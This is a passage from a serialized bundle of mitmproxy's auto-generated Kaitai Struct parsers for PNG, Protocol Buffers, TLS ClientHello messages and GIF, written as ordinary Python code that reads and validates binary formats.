kaitaistruct.ValidationNotEqualError(b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\", self.magic, self._io, u\"/seq/0\")\n        self.ihdr_len = self._io.read_u4be()\n        if not self.ihdr_len == 13:\n            raise kaitaistruct.ValidationNotEqualError(13, self.ihdr_len, self._io, u\"/seq/1\")\n        self.ihdr_type = self._io.read_bytes(4)\n        if not self.ihdr_type == b\"\\x49\\x48\\x44\\x52\":\n            raise kaitaistruct.ValidationNotEqualError(b\"\\x49\\x48\\x44\\x52\", self.ihdr_type, self._io, u\"/seq/2\")\n        self.ihdr = Png.IhdrChunk(self._io, self, self._root)\n        self.ihdr_crc = self._io.read_bytes(4)\n        self.chunks = []\n        i = 0\n        while True:\n            _ = Png.Chunk(self._io, self, self._root)\n            self.chunks.append(_)\n            if  ((_.type == u\"IEND\") or (self._io.is_eof())) :\n                break\n            i += 1\n\n    class Rgb(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.r = self._io.read_u1()\n            self.g = self._io.read_u1()\n            self.b = self._io.read_u1()\n\n\n    class Chunk(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u4be()\n            self.type = (self._io.read_bytes(4)).decode(u\"UTF-8\")\n            _on = self.type\n            if _on == u\"iTXt\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.InternationalTextChunk(_io__raw_body, self, self._root)\n            elif _on == u\"gAMA\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.GamaChunk(_io__raw_body, self, self._root)\n            elif _on == u\"tIME\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.TimeChunk(_io__raw_body, self, self._root)\n            elif _on == u\"PLTE\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.PlteChunk(_io__raw_body, self, self._root)\n            elif _on == u\"bKGD\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.BkgdChunk(_io__raw_body, self, self._root)\n            elif _on == u\"pHYs\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.PhysChunk(_io__raw_body, self, self._root)\n            elif _on == u\"fdAT\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.FrameDataChunk(_io__raw_body, self, self._root)\n            elif _on == u\"tEXt\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.TextChunk(_io__raw_body, self, self._root)\n            elif _on == u\"cHRM\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.ChrmChunk(_io__raw_body, self, self._root)\n            elif _on == u\"acTL\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.AnimationControlChunk(_io__raw_body, self, self._root)\n            elif _on == u\"sRGB\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.SrgbChunk(_io__raw_body, self, self._root)\n            elif _on == u\"zTXt\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.CompressedTextChunk(_io__raw_body, self, self._root)\n            elif _on == u\"fcTL\":\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = Png.FrameControlChunk(_io__raw_body, self, self._root)\n            else:\n                self.body = self._io.read_bytes(self.len)\n            self.crc = self._io.read_bytes(4)\n\n\n    class BkgdIndexed(KaitaiStruct):\n        \"\"\"Background chunk for images with indexed palette.\"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.palette_index = self._io.read_u1()\n\n\n    class Point(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.x_int = self._io.read_u4be()\n            self.y_int = self._io.read_u4be()\n\n        @property\n        def x(self):\n            if hasattr(self, '_m_x'):\n                return self._m_x\n\n            self._m_x = (self.x_int / 100000.0)\n            return getattr(self, '_m_x', None)\n\n        @property\n        def y(self):\n            if hasattr(self, '_m_y'):\n                return self._m_y\n\n            self._m_y = (self.y_int / 100000.0)\n            return getattr(self, '_m_y', None)\n\n\n    class BkgdGreyscale(KaitaiStruct):\n        \"\"\"Background chunk for greyscale images.\"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.value = self._io.read_u2be()\n\n\n    class ChrmChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11cHRM\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.white_point = Png.Point(self._io, self, self._root)\n            self.red = Png.Point(self._io, self, self._root)\n            self.green = Png.Point(self._io, self, self._root)\n            self.blue = Png.Point(self._io, self, self._root)\n\n\n    class IhdrChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11IHDR\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.width = self._io.read_u4be()\n            self.height = self._io.read_u4be()\n            self.bit_depth = self._io.read_u1()\n            self.color_type = KaitaiStream.resolve_enum(Png.ColorType, self._io.read_u1())\n            self.compression_method = self._io.read_u1()\n            self.filter_method = self._io.read_u1()\n            self.interlace_method = self._io.read_u1()\n\n\n    class PlteChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11PLTE\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.entries = []\n            i = 0\n            while not self._io.is_eof():\n                self.entries.append(Png.Rgb(self._io, self, self._root))\n                i += 1\n\n\n\n    class SrgbChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11sRGB\n        \"\"\"\n\n        class Intent(Enum):\n            perceptual = 0\n            relative_colorimetric = 1\n            saturation = 2\n            absolute_colorimetric = 3\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.render_intent = KaitaiStream.resolve_enum(Png.SrgbChunk.Intent, self._io.read_u1())\n\n\n    class CompressedTextChunk(KaitaiStruct):\n        \"\"\"Compressed text chunk effectively allows to store key-value\n        string pairs in PNG container, compressing \"value\" part (which\n        can be quite lengthy) with zlib compression.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11zTXt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.keyword = (self._io.read_bytes_term(0, False, True, True)).decode(u\"UTF-8\")\n            self.compression_method = KaitaiStream.resolve_enum(Png.CompressionMethods, self._io.read_u1())\n            self._raw_text_datastream = self._io.read_bytes_full()\n            self.text_datastream = zlib.decompress(self._raw_text_datastream)\n\n\n    class FrameDataChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://wiki.mozilla.org/APNG_Specification#.60fdAT.60:_The_Frame_Data_Chunk\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.sequence_number = self._io.read_u4be()\n            self.frame_data = self._io.read_bytes_full()\n\n\n    class BkgdTruecolor(KaitaiStruct):\n        \"\"\"Background chunk for truecolor images.\"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.red = self._io.read_u2be()\n            self.green = self._io.read_u2be()\n            self.blue = self._io.read_u2be()\n\n\n    class GamaChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11gAMA\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.gamma_int = self._io.read_u4be()\n\n        @property\n        def gamma_ratio(self):\n            if hasattr(self, '_m_gamma_ratio'):\n                return self._m_gamma_ratio\n\n            self._m_gamma_ratio = (100000.0 / self.gamma_int)\n            return getattr(self, '_m_gamma_ratio', None)\n\n\n    class BkgdChunk(KaitaiStruct):\n        \"\"\"Background chunk stores default background color to display this\n        image against. Contents depend on `color_type` of the image.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11bKGD\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            _on = self._root.ihdr.color_type\n            if _on == Png.ColorType.indexed:\n                self.bkgd = Png.BkgdIndexed(self._io, self, self._root)\n            elif _on == Png.ColorType.truecolor_alpha:\n                self.bkgd = Png.BkgdTruecolor(self._io, self, self._root)\n            elif _on == Png.ColorType.greyscale_alpha:\n                self.bkgd = Png.BkgdGreyscale(self._io, self, self._root)\n            elif _on == Png.ColorType.truecolor:\n                self.bkgd = Png.BkgdTruecolor(self._io, self, self._root)\n            elif _on == Png.ColorType.greyscale:\n                self.bkgd = Png.BkgdGreyscale(self._io, self, self._root)\n\n\n    class PhysChunk(KaitaiStruct):\n        \"\"\"\"Physical size\" chunk stores data that allows to translate\n        logical pixels into physical units (meters, etc) and vice-versa.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11pHYs\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.pixels_per_unit_x = self._io.read_u4be()\n            self.pixels_per_unit_y = self._io.read_u4be()\n            self.unit = KaitaiStream.resolve_enum(Png.PhysUnit, self._io.read_u1())\n\n\n    class FrameControlChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://wiki.mozilla.org/APNG_Specification#.60fcTL.60:_The_Frame_Control_Chunk\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.sequence_number = self._io.read_u4be()\n            self.width = self._io.read_u4be()\n            if not self.width >= 1:\n                raise kaitaistruct.ValidationLessThanError(1, self.width, self._io, u\"/types/frame_control_chunk/seq/1\")\n            if not self.width <= self._root.ihdr.width:\n                raise kaitaistruct.ValidationGreaterThanError(self._root.ihdr.width, self.width, self._io, u\"/types/frame_control_chunk/seq/1\")\n            self.height = self._io.read_u4be()\n            if not self.height >= 1:\n                raise kaitaistruct.ValidationLessThanError(1, self.height, self._io, u\"/types/frame_control_chunk/seq/2\")\n            if not self.height <= self._root.ihdr.height:\n                raise kaitaistruct.ValidationGreaterThanError(self._root.ihdr.height, self.height, self._io, u\"/types/frame_control_chunk/seq/2\")\n            self.x_offset = self._io.read_u4be()\n            if not self.x_offset <= (self._root.ihdr.width - self.width):\n                raise kaitaistruct.ValidationGreaterThanError((self._root.ihdr.width - self.width), self.x_offset, self._io, u\"/types/frame_control_chunk/seq/3\")\n            self.y_offset = self._io.read_u4be()\n            if not self.y_offset <= (self._root.ihdr.height - self.height):\n                raise kaitaistruct.ValidationGreaterThanError((self._root.ihdr.height - self.height), self.y_offset, self._io, u\"/types/frame_control_chunk/seq/4\")\n            self.delay_num = self._io.read_u2be()\n            self.delay_den = self._io.read_u2be()\n            self.dispose_op = KaitaiStream.resolve_enum(Png.DisposeOpValues, self._io.read_u1())\n            self.blend_op = KaitaiStream.resolve_enum(Png.BlendOpValues, self._io.read_u1())\n\n        @property\n        def delay(self):\n            \"\"\"Time to display this frame, in seconds.\"\"\"\n            if hasattr(self, '_m_delay'):\n                return self._m_delay\n\n            self._m_delay = (self.delay_num / (100.0 if self.delay_den == 0 else self.delay_den))\n            return getattr(self, '_m_delay', None)\n\n\n    class InternationalTextChunk(KaitaiStruct):\n        \"\"\"International text chunk effectively allows to store key-value string pairs in\n        PNG container. Both \"key\" (keyword) and \"value\" (text) parts are\n        given in pre-defined subset of iso8859-1 without control\n        characters.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11iTXt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.keyword = (self._io.read_bytes_term(0, False, True, True)).decode(u\"UTF-8\")\n            self.compression_flag = self._io.read_u1()\n            self.compression_method = KaitaiStream.resolve_enum(Png.CompressionMethods, self._io.read_u1())\n            self.language_tag = (self._io.read_bytes_term(0, False, True, True)).decode(u\"ASCII\")\n            self.translated_keyword = (self._io.read_bytes_term(0, False, True, True)).decode(u\"UTF-8\")\n            self.text = (self._io.read_bytes_full()).decode(u\"UTF-8\")\n\n\n    class TextChunk(KaitaiStruct):\n        \"\"\"Text chunk effectively allows to store key-value string pairs in\n        PNG container. Both \"key\" (keyword) and \"value\" (text) parts are\n        given in pre-defined subset of iso8859-1 without control\n        characters.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11tEXt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.keyword = (self._io.read_bytes_term(0, False, True, True)).decode(u\"iso8859-1\")\n            self.text = (self._io.read_bytes_full()).decode(u\"iso8859-1\")\n\n\n    class AnimationControlChunk(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           Source - https://wiki.mozilla.org/APNG_Specification#.60acTL.60:_The_Animation_Control_Chunk\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.num_frames = self._io.read_u4be()\n            self.num_plays = self._io.read_u4be()\n\n\n    class TimeChunk(KaitaiStruct):\n        \"\"\"Time chunk stores time stamp of last modification of this image,\n        up to 1 second precision in UTC timezone.\n        \n        .. seealso::\n           Source - https://www.w3.org/TR/PNG/#11tIME\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.year = self._io.read_u2be()\n            self.month = self._io.read_u1()\n            self.day = self._io.read_u1()\n            self.hour = self._io.read_u1()\n            self.minute = self._io.read_u1()\n            self.second = self._io.read_u1()\n\n\n\n", "mitmproxy/contrib/kaitaistruct/google_protobuf.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStream, KaitaiStruct\nfrom enum import Enum\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nfrom . import vlq_base128_le\nclass GoogleProtobuf(KaitaiStruct):\n    \"\"\"Google Protocol Buffers (AKA protobuf) is a popular data\n    serialization scheme used for communication protocols, data storage,\n    etc. There are implementations are available for almost every\n    popular language. The focus points of this scheme are brevity (data\n    is encoded in a very size-efficient manner) and extensibility (one\n    can add keys to the structure, while keeping it readable in previous\n    version of software).\n    \n    Protobuf uses semi-self-describing encoding scheme for its\n    messages. It means that it is possible to parse overall structure of\n    the message (skipping over fields one can't understand), but to\n    fully understand the message, one needs a protocol definition file\n    (`.proto`). To be specific:\n    \n    * \"Keys\" in key-value pairs provided in the message are identified\n      only with an integer \"field tag\". `.proto` file provides info on\n      which symbolic field names these field tags map to.\n    * \"Keys\" also provide something called \"wire type\". It's not a data\n      type in its common sense (i.e. you can't, for example, distinguish\n      `sint32` vs `uint32` vs some enum, or `string` from `bytes`), but\n      it's enough information to determine how many bytes to\n      parse. Interpretation of the value should be done according to the\n      type specified in `.proto` file.\n    * There's no direct information on which fields are optional /\n      required, which fields may be repeated or constitute a map, what\n      restrictions are placed on fields usage in a single message, what\n      are the fields' default values, etc, etc.\n    \n    .. seealso::\n       Source - https://developers.google.com/protocol-buffers/docs/encoding\n    \"\"\"\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.pairs = []\n        i = 0\n        while not self._io.is_eof():\n            self.pairs.append(GoogleProtobuf.Pair(self._io, self, self._root))\n            i += 1\n\n\n    class Pair(KaitaiStruct):\n        \"\"\"Key-value pair.\"\"\"\n\n        class WireTypes(Enum):\n            varint = 0\n            bit_64 = 1\n            len_delimited = 2\n            group_start = 3\n            group_end = 4\n            bit_32 = 5\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.key = vlq_base128_le.VlqBase128Le(self._io)\n            _on = self.wire_type\n            if _on == GoogleProtobuf.Pair.WireTypes.varint:\n                self.value = vlq_base128_le.VlqBase128Le(self._io)\n            elif _on == GoogleProtobuf.Pair.WireTypes.len_delimited:\n                self.value = GoogleProtobuf.DelimitedBytes(self._io, self, self._root)\n            elif _on == GoogleProtobuf.Pair.WireTypes.bit_64:\n                self.value = self._io.read_u8le()\n            elif _on == GoogleProtobuf.Pair.WireTypes.bit_32:\n                self.value = self._io.read_u4le()\n\n        @property\n        def wire_type(self):\n            \"\"\"\"Wire type\" is a part of the \"key\" that carries enough\n            information to parse value from the wire, i.e. read correct\n            amount of bytes, but there's not enough informaton to\n            interprete in unambiguously. For example, one can't clearly\n            distinguish 64-bit fixed-sized integers from 64-bit floats,\n            signed zigzag-encoded varints from regular unsigned varints,\n            arbitrary bytes from UTF-8 encoded strings, etc.\n            \"\"\"\n            if hasattr(self, '_m_wire_type'):\n                return self._m_wire_type\n\n            self._m_wire_type = KaitaiStream.resolve_enum(GoogleProtobuf.Pair.WireTypes, (self.key.value & 7))\n            return getattr(self, '_m_wire_type', None)\n\n        @property\n        def field_tag(self):\n            \"\"\"Identifies a field of protocol. One can look up symbolic\n            field name in a `.proto` file by this field tag.\n            \"\"\"\n            if hasattr(self, '_m_field_tag'):\n                return self._m_field_tag\n\n            self._m_field_tag = (self.key.value >> 3)\n            return getattr(self, '_m_field_tag', None)\n\n\n    class DelimitedBytes(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = vlq_base128_le.VlqBase128Le(self._io)\n            self.body = self._io.read_bytes(self.len.value)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/tls_client_hello.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass TlsClientHello(KaitaiStruct):\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.version = TlsClientHello.Version(self._io, self, self._root)\n        self.random = TlsClientHello.Random(self._io, self, self._root)\n        self.session_id = TlsClientHello.SessionId(self._io, self, self._root)\n        self.cipher_suites = TlsClientHello.CipherSuites(self._io, self, self._root)\n        self.compression_methods = TlsClientHello.CompressionMethods(self._io, self, self._root)\n        if self._io.is_eof() == False:\n            self.extensions = TlsClientHello.Extensions(self._io, self, self._root)\n\n\n    class ServerName(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.name_type = self._io.read_u1()\n            self.length = self._io.read_u2be()\n            self.host_name = self._io.read_bytes(self.length)\n\n\n    class Random(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.gmt_unix_time = self._io.read_u4be()\n            self.random = self._io.read_bytes(28)\n\n\n    class SessionId(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u1()\n            self.sid = self._io.read_bytes(self.len)\n\n\n    class Sni(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.list_length = self._io.read_u2be()\n            self.server_names = []\n            i = 0\n            while not self._io.is_eof():\n                self.server_names.append(TlsClientHello.ServerName(self._io, self, self._root))\n                i += 1\n\n\n\n    class CipherSuites(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u2be()\n            self.cipher_suites = []\n            for i in range(self.len // 2):\n                self.cipher_suites.append(self._io.read_u2be())\n\n\n\n    class CompressionMethods(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u1()\n            self.compression_methods = self._io.read_bytes(self.len)\n\n\n    class Alpn(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.ext_len = self._io.read_u2be()\n            self.alpn_protocols = []\n            i = 0\n            while not self._io.is_eof():\n                self.alpn_protocols.append(TlsClientHello.Protocol(self._io, self, self._root))\n                i += 1\n\n\n\n    class Extensions(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.len = self._io.read_u2be()\n            self.extensions = []\n            i = 0\n            while not self._io.is_eof():\n                self.extensions.append(TlsClientHello.Extension(self._io, self, self._root))\n                i += 1\n\n\n\n    class Version(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.major = self._io.read_u1()\n            self.minor = self._io.read_u1()\n\n\n    class Protocol(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.strlen = self._io.read_u1()\n            self.name = self._io.read_bytes(self.strlen)\n\n\n    class Extension(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.type = self._io.read_u2be()\n            self.len = self._io.read_u2be()\n            _on = self.type\n            if _on == 0:\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = TlsClientHello.Sni(_io__raw_body, self, self._root)\n            elif _on == 16:\n                self._raw_body = self._io.read_bytes(self.len)\n                _io__raw_body = KaitaiStream(BytesIO(self._raw_body))\n                self.body = TlsClientHello.Alpn(_io__raw_body, self, self._root)\n            else:\n                self.body = self._io.read_bytes(self.len)\n\n\n\n", "mitmproxy/contrib/kaitaistruct/__init__.py": "", "mitmproxy/contrib/kaitaistruct/gif.py": "# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild\n\nimport kaitaistruct\nfrom kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO\nfrom enum import Enum\n\n\nif getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):\n    raise Exception(\"Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s\" % (kaitaistruct.__version__))\n\nclass Gif(KaitaiStruct):\n    \"\"\"GIF (Graphics Interchange Format) is an image file format, developed\n    in 1987. It became popular in 1990s as one of the main image formats\n    used in World Wide Web.\n    \n    GIF format allows encoding of palette-based images up to 256 colors\n    (each of the colors can be chosen from a 24-bit RGB\n    colorspace). Image data stream uses LZW (Lempel-Ziv-Welch) lossless\n    compression.\n    \n    Over the years, several version of the format were published and\n    several extensions to it were made, namely, a popular Netscape\n    extension that allows to store several images in one file, switching\n    between them, which produces crude form of animation.\n    \n    Structurally, format consists of several mandatory headers and then\n    a stream of blocks follows. Blocks can carry additional\n    metainformation or image data.\n    \"\"\"\n\n    class BlockType(Enum):\n        extension = 33\n        local_image_descriptor = 44\n        end_of_file = 59\n\n    class ExtensionLabel(Enum):\n        graphic_control = 249\n        comment = 254\n        application = 255\n    def __init__(self, _io, _parent=None, _root=None):\n        self._io = _io\n        self._parent = _parent\n        self._root = _root if _root else self\n        self._read()\n\n    def _read(self):\n        self.hdr = Gif.Header(self._io, self, self._root)\n        self.logical_screen_descriptor = Gif.LogicalScreenDescriptorStruct(self._io, self, self._root)\n        if self.logical_screen_descriptor.has_color_table:\n            self._raw_global_color_table = self._io.read_bytes((self.logical_screen_descriptor.color_table_size * 3))\n            _io__raw_global_color_table = KaitaiStream(BytesIO(self._raw_global_color_table))\n            self.global_color_table = Gif.ColorTable(_io__raw_global_color_table, self, self._root)\n\n        self.blocks = []\n        i = 0\n        while True:\n            _ = Gif.Block(self._io, self, self._root)\n            self.blocks.append(_)\n            if  ((self._io.is_eof()) or (_.block_type == Gif.BlockType.end_of_file)) :\n                break\n            i += 1\n\n    class ImageData(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           - section 22 - https://www.w3.org/Graphics/GIF/spec-gif89a.txt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.lzw_min_code_size = self._io.read_u1()\n            self.subblocks = Gif.Subblocks(self._io, self, self._root)\n\n\n    class ColorTableEntry(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.red = self._io.read_u1()\n            self.green = self._io.read_u1()\n            self.blue = self._io.read_u1()\n\n\n    class LogicalScreenDescriptorStruct(KaitaiStruct):\n        \"\"\"\n        .. seealso::\n           - section 18 - https://www.w3.org/Graphics/GIF/spec-gif89a.txt\n        \"\"\"\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.screen_width = self._io.read_u2le()\n            self.screen_height = self._io.read_u2le()\n            self.flags = self._io.read_u1()\n            self.bg_color_index = self._io.read_u1()\n            self.pixel_aspect_ratio = self._io.read_u1()\n\n        @property\n        def has_color_table(self):\n            if hasattr(self, '_m_has_color_table'):\n                return self._m_has_color_table\n\n            self._m_has_color_table = (self.flags & 128) != 0\n            return getattr(self, '_m_has_color_table', None)\n\n        @property\n        def color_table_size(self):\n            if hasattr(self, '_m_color_table_size'):\n                return self._m_color_table_size\n\n            self._m_color_table_size = (2 << (self.flags & 7))\n            return getattr(self, '_m_color_table_size', None)\n\n\n    class LocalImageDescriptor(KaitaiStruct):\n        def __init__(self, _io, _parent=None, _root=None):\n            self._io = _io\n            self._parent = _parent\n            self._root = _root if _root else self\n            self._read()\n\n        def _read(self):\n            self.left = self._io.read_u2le()\n            self.top = self._io.read_u2le()\n            self.width = self._io.read_u2le()\n            self.height = self._io.read_u2le()\n            self.flags = self._io.read_u1()\n            if self.has_color_table:\n                self._raw_local_color_table = self._io.read_bytes((self.color_table_size * 3))\n                _io__raw_local_color_table = KaitaiStream(BytesIO(self._raw_local_color_table))\n                self.local_color_table = Gif.ColorTable(_io__raw_local_color_table, self, self._root)\n\n            self.image_data = Gif.ImageData(self._io, self, self._root)\n\n        @property\n        def has_color_table(self):\n            if hasattr(self, '_m_has_color_table'):\n                return self._m_has_color_table\n\n            self._m_has_color_table = (self.flags & 128) != 0\n            return getattr(self, '_m_has_color_table', None)\n\n        @property\n        def has_interlace(self):\n    